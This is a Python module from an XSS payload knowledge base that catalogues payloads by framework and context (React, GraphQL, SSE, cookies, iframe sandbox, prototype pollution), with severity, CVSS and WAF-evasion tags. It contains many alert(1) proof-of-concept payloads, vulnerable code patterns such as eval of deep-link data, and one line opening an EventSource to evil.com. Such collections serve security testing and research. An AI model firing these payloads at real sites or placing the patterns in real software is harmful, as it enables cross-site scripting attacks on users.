#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Context Enrichment Payloads
Additional payloads for contexts with low coverage.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === Backbone.js Additional ===
BACKBONE_EXTRA_PAYLOADS = {
    "backbone-model-set": PayloadEntry(
        payload='model.set({html: "<img src=x onerror=alert(1)>"})',
        contexts=["backbone", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Backbone model set with XSS data",
        tags=["backbone", "model", "set", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "backbone-view-render": PayloadEntry(
        payload="this.template(userInput)",
        contexts=["backbone", "javascript", "template"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Backbone view template rendering",
        tags=["backbone", "view", "template", "render"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Blob URL Additional ===
BLOB_URL_EXTRA_PAYLOADS = {
    "blob-url-iframe": PayloadEntry(
        payload='<iframe src="blob:null/uuid"></iframe>',
        contexts=["blob_url", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Blob URL in iframe src",
        tags=["blob", "url", "iframe", "src"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "blob-url-object": PayloadEntry(
        payload='<object data="blob:https://example.com/uuid" type="text/html"></object>',
        contexts=["blob_url", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="Blob URL in object data",
        tags=["blob", "url", "object", "data"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Capacitor Additional ===
CAPACITOR_EXTRA_PAYLOADS = {
    "capacitor-app-url": PayloadEntry(
        payload='App.addListener("appUrlOpen", (data) => { eval(data.url.split("code=")[1]); })',
        contexts=["capacitor", "javascript", "url"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Capacitor deep link URL injection",
        tags=["capacitor", "deeplink", "url", "injection"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "capacitor-http": PayloadEntry(
        payload='await Http.request({url: userInput, method: "GET"})',
        contexts=["capacitor", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Capacitor HTTP SSRF",
        tags=["capacitor", "http", "ssrf", "request"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Cookie Additional ===
COOKIE_EXTRA_PAYLOADS = {
    "cookie-xss-read": PayloadEntry(
        payload="document.body.innerHTML = document.cookie",
        contexts=["cookie", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Cookie value rendered as HTML",
        tags=["cookie", "xss", "innerHTML", "render"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "cookie-inject-script": PayloadEntry(
        payload='document.cookie = "xss=<script>alert(1)</script>"',
        contexts=["cookie", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="XSS payload stored in cookie",
        tags=["cookie", "xss", "store", "persist"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "cookie-json-parse": PayloadEntry(
        payload='JSON.parse(getCookie("userPrefs")).forEach(p => eval(p))',
        contexts=["cookie", "javascript", "json"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Cookie JSON parsed with eval",
        tags=["cookie", "json", "parse", "eval"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Flash Additional ===
FLASH_EXTRA_PAYLOADS = {
    "flash-geturl": PayloadEntry(
        payload='getURL("javascript:alert(1)")',
        contexts=["flash", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Flash getURL javascript protocol",
        tags=["flash", "geturl", "javascript", "legacy"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "flash-externalinterface": PayloadEntry(
        payload='ExternalInterface.call("eval", userInput)',
        contexts=["flash", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Flash ExternalInterface.call eval",
        tags=["flash", "externalinterface", "eval", "legacy"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === GraphQL Additional ===
GRAPHQL_EXTRA_PAYLOADS = {
    "graphql-batch-xss": PayloadEntry(
        payload='[{"query":"mutation{createUser(name:\\"<script>alert(1)</script>\\")}"},{"query":"query{users{name}}"}]',
        contexts=["graphql_batch", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="GraphQL batch query with XSS",
        tags=["graphql", "batch", "mutation", "xss"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "graphql-batch-injection": PayloadEntry(
        payload='[{"query":"query{__typename}"},{"query":"mutation{injectXSS(payload:\\"<img src=x onerror=alert(1)>\\")}"}]',
        contexts=["graphql_batch", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="GraphQL batch with hidden mutation",
        tags=["graphql", "batch", "hidden", "mutation"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "graphql-mutation-stored": PayloadEntry(
        payload='mutation{updateProfile(bio:"<svg onload=alert(1)>")}',
        contexts=["graphql_mutation", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="GraphQL mutation stored XSS",
        tags=["graphql", "mutation", "stored", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "graphql-persisted-bypass": PayloadEntry(
        payload='{"id":"abc123","variables":{"input":"<script>alert(1)</script>"}}',
        contexts=["graphql_persisted", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="GraphQL persisted query variable injection",
        tags=["graphql", "persisted", "variable", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "graphql-persisted-hash": PayloadEntry(
        payload='{"extensions":{"persistedQuery":{"sha256Hash":"malicious_hash"}}}',
        contexts=["graphql_persisted", "json"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="GraphQL persisted query hash manipulation",
        tags=["graphql", "persisted", "hash", "manipulation"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === React Additional ===
REACT_EXTRA_PAYLOADS = {
    "react-ref-dom": PayloadEntry(
        payload="useEffect(() => { ref.current.innerHTML = userInput; }, [])",
        contexts=["react", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="React ref direct DOM manipulation",
        tags=["react", "ref", "dom", "innerHTML"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "react-create-element": PayloadEntry(
        payload='React.createElement("div", {dangerouslySetInnerHTML: {__html: userInput}})',
        contexts=["react", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=8.5,
        description="React createElement with dangerouslySetInnerHTML",
        tags=["react", "createElement", "dangerous", "html"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === SSE (Server-Sent Events) Additional ===
SSE_EXTRA_PAYLOADS = {
    "sse-event-type-xss": PayloadEntry(
        payload="event: <script>alert(1)</script>\ndata: payload\n\n",
        contexts=["sse_event", "sse_handler"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="SSE event type XSS injection",
        tags=["sse", "event", "type", "xss"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sse-data-html": PayloadEntry(
        payload='data: {"html":"<img src=x onerror=alert(1)>"}\n\n',
        contexts=["sse_event", "sse_handler", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="SSE data JSON with HTML payload",
        tags=["sse", "data", "json", "html"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "sse-id-injection": PayloadEntry(
        payload="id: </script><script>alert(1)</script>\ndata: x\n\n",
        contexts=["sse_id", "sse_event"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="SSE id field injection",
        tags=["sse", "id", "injection", "xss"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sse-url-redirect": PayloadEntry(
        payload='new EventSource("https://evil.com/sse")',
        contexts=["sse_url", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SSE URL to attacker server",
        tags=["sse", "url", "redirect", "attacker"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === XHTML Strict Additional ===
XHTML_EXTRA_PAYLOADS = {
    "xhtml-cdata-xss": PayloadEntry(
        payload="<script><![CDATA[alert(1)]]></script>",
        contexts=["xhtml_strict", "html_content", "xml"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="XHTML CDATA script injection",
        tags=["xhtml", "cdata", "script", "xml"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "xhtml-entity-xss": PayloadEntry(
        payload="<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>",
        contexts=["xhtml_strict", "html_content", "xml"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="XHTML entity encoding bypass",
        tags=["xhtml", "entity", "encoding", "bypass"],
        reliability=Reliability.LOW,
        encoding=Encoding.HTML_ENTITIES,
        waf_evasion=True,
    ),
    "xhtml-namespace-svg": PayloadEntry(
        payload='<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        contexts=["xhtml_strict", "html_content", "svg"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="XHTML SVG namespace script",
        tags=["xhtml", "svg", "namespace", "script"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === Iframe Sandbox Additional ===
IFRAME_SANDBOX_EXTRA_PAYLOADS = {
    "iframe-sandbox-allow-scripts": PayloadEntry(
        payload='<iframe sandbox="allow-scripts" srcdoc="<script>alert(1)</script>"></iframe>',
        contexts=["iframe_sandbox", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Iframe sandbox with allow-scripts",
        tags=["iframe", "sandbox", "allow-scripts", "srcdoc"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "iframe-sandbox-escape": PayloadEntry(
        payload='<iframe sandbox="allow-scripts allow-same-origin" src="javascript:parent.alert(1)"></iframe>',
        contexts=["iframe_sandbox", "html_content", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Iframe sandbox escape to parent",
        tags=["iframe", "sandbox", "escape", "parent"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === IndexedDB Additional ===
INDEXEDDB_EXTRA_PAYLOADS = {
    "indexeddb-cursor-xss": PayloadEntry(
        payload="objectStore.openCursor().onsuccess = e => { document.body.innerHTML += e.target.result.value; e.target.result.continue(); }",
        contexts=["indexeddb", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="IndexedDB cursor iteration XSS",
        tags=["indexeddb", "cursor", "iterate", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === JS Object Additional ===
JS_OBJECT_EXTRA_PAYLOADS = {
    "js-object-proto-set": PayloadEntry(
        payload='obj["__proto__"]["innerHTML"] = "<img src=x onerror=alert(1)>"',
        contexts=["js_object", "javascript", "prototype_pollution"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="JS object prototype pollution via bracket notation",
        tags=["javascript", "object", "prototype", "pollution"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "js-object-computed-prop": PayloadEntry(
        payload='const key = "constructor"; obj[key]["prototype"]["xss"] = "<script>alert(1)</script>"',
        contexts=["js_object", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="JS computed property prototype access",
        tags=["javascript", "object", "computed", "constructor"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === JSON Value Additional ===
JSON_VALUE_EXTRA_PAYLOADS = {
    "json-value-script": PayloadEntry(
        payload='{"content":"<script>alert(1)</script>"}',
        contexts=["json_value", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JSON value with script tag",
        tags=["json", "value", "script", "xss"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "json-value-unicode": PayloadEntry(
        payload='{"xss":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}',
        contexts=["json_value", "json"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JSON Unicode escaped XSS",
        tags=["json", "value", "unicode", "escape"],
        reliability=Reliability.HIGH,
        encoding=Encoding.UNICODE,
        waf_evasion=True,
    ),
}

# Combined
CONTEXT_ENRICHMENT_PAYLOADS = {
    **BACKBONE_EXTRA_PAYLOADS,
    **BLOB_URL_EXTRA_PAYLOADS,
    **CAPACITOR_EXTRA_PAYLOADS,
    **COOKIE_EXTRA_PAYLOADS,
    **FLASH_EXTRA_PAYLOADS,
    **GRAPHQL_EXTRA_PAYLOADS,
    **REACT_EXTRA_PAYLOADS,
    **SSE_EXTRA_PAYLOADS,
    **XHTML_EXTRA_PAYLOADS,
    **IFRAME_SANDBOX_EXTRA_PAYLOADS,
    **INDEXEDDB_EXTRA_PAYLOADS,
    **JS_OBJECT_EXTRA_PAYLOADS,
    **JSON_VALUE_EXTRA_PAYLOADS,
}

CONTEXT_ENRICHMENT_TOTAL = len(CONTEXT_ENRICHMENT_PAYLOADS)
